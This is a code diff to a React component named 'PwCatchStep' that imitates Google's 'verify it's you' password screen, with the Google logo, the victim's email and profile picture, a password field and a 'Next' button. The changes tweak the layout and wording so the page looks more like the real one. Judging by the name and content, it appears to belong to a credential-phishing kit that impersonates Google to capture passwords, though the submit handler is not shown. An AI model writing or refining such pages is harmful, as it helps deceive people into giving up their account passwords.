@@ -47,10 +47,10 @@ export default function PwCatchStep({ email, name, profilePicture }: PwCatchStep
   };
 
   return (
-    <div className="w-full grid md:grid-cols-2 gap-12 text-left">
+    <div className="w-full grid md:grid-cols-2 gap-12 text-left items-center">
         <div className="space-y-8">
-            <img width="75" height="24" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="google-logo"/>
-            <h1 className="text-3xl font-normal">Hi {name || (email || '').split('@')[0]}</h1>
+            <img width="48" height="48" src="https://img.icons8.com/color/48/google-logo.png" alt="google-logo" className="mb-4"/>
+            <h1 className="text-3xl font-normal">Welcome</h1>
             <div className="flex items-center justify-between gap-2 rounded-full border p-1 pr-3 w-fit">
                 <div className="flex items-center gap-2">
                 {profilePicture ? (
@@ -72,8 +72,8 @@ export default function PwCatchStep({ email, name, profilePicture }: PwCatchStep
         </div>
 
       <div className="w-full">
-        <h2 className="text-lg">To continue, first verify it’s you</h2>
-        <form onSubmit={handleSubmit(onSubmit)} className="mt-8 space-y-6">
+        <p className="text-sm mb-4">To continue, first verify it’s you</p>
+        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
             <div className="relative">
                 <Input
                     id="password"
@@ -96,7 +96,7 @@ export default function PwCatchStep({ email, name, profilePicture }: PwCatchStep
             </div>
           
             <div className="flex justify-between items-center pt-4">
-                <Button variant="ghost" className="text-primary -ml-4">Try another way</Button>
+                <Button variant="ghost" className="text-primary -ml-4">Forgot password?</Button>
                 <Button type="submit" disabled={isSubmitting}>
                     {isSubmitting ? "Verifying..." : "Next"}
                 </Button>
